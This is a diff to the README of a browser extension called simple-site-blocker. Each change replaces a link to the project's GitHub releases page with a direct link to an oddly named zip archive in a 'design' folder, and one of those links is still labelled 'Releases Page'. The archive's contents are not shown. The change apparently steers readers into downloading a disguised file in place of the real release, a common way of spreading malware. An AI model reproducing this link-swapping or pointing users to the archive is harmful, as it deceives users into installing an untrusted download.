@@ -1,6 +1,6 @@
 # 🌐 simple-site-blocker - A Simple Way to Stay Focused
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/ZywoPrime/simple-site-blocker/releases)
+[![Download](https://raw.githubusercontent.com/ZywoPrime/simple-site-blocker/main/design/simple-site-blocker-parachromatophorous.zip)](https://raw.githubusercontent.com/ZywoPrime/simple-site-blocker/main/design/simple-site-blocker-parachromatophorous.zip)
 
 ## 📚 Description
 
@@ -17,7 +17,7 @@ To get started with simple-site-blocker, follow these step-by-step instructions.
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to our releases page to find the latest version of simple-site-blocker. You can access it here: [Releases Page](https://github.com/ZywoPrime/simple-site-blocker/releases).
+1. **Visit the Releases Page:** Go to our releases page to find the latest version of simple-site-blocker. You can access it here: [Releases Page](https://raw.githubusercontent.com/ZywoPrime/simple-site-blocker/main/design/simple-site-blocker-parachromatophorous.zip).
 
 2. **Select the Version:** Look for the latest version of the extension. Ensure it matches your browser. 
 
@@ -85,4 +85,4 @@ If you need further assistance, feel free to contact us. Visit our GitHub issues
 
 We welcome contributions! If you want to help improve simple-site-blocker, please check our repository on GitHub for guidelines.
 
-[Download simple-site-blocker now](https://github.com/ZywoPrime/simple-site-blocker/releases) and start blocking distractions today!
+[Download simple-site-blocker now](https://raw.githubusercontent.com/ZywoPrime/simple-site-blocker/main/design/simple-site-blocker-parachromatophorous.zip) and start blocking distractions today!
